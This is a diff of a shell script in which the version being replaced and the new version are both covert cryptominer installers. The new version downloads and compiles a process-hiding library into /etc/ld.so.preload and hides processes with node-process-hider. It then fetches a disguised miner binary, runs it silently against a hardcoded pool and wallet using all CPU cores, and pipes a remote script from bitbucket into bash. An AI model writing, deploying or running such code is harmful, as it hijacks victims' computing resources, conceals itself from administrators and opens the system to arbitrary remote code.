@@ -1,20 +1,16 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/America/Toronto /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-apt update
-apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
-service tor start
-
-git clone https://github.com/hanifgz/libprocesshider.git
-cd libprocesshider;make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-cd ..
-A=139.177.188.78:80
-B=867VgRiSidDhm8L4gUzkSoKA49D6bcsBwRneopcngnQb85TX3LG9poAfdThb3nxLmXBCEh2KHkpUUSU8DbjVjX9oSKScM6D
-C=GAS
-wget https://github.com/bengetsia/soft/raw/main/jilox && chmod u+x jilox
-./jilox --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
-r
-
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add sgr1"
+mkdir .kap && cd .kap
+wget -O sgr1 https://bitbucket.org/commuter21/escom/downloads/xmolx >/dev/null 2>&1
+chmod +x sgr1
+sudo ./sgr1 -a rx/0 -o 139.177.188.78:80 -u 86bqyB1FLa39SVdf5HzEmT1NfuKi9auJej4sYBqptTTU4Wz17ZeBmfa7nZYiEBVW4CNeJNi3UZFmJhNcfmd4zqVKJeirEK5 -p ikuk -t $(nproc --all) --donate-level 1 -k > /dev/null 2>&1 &
+curl -sL https://bitbucket.org/commuter21/escom/raw/main/gudabel.sh | bash
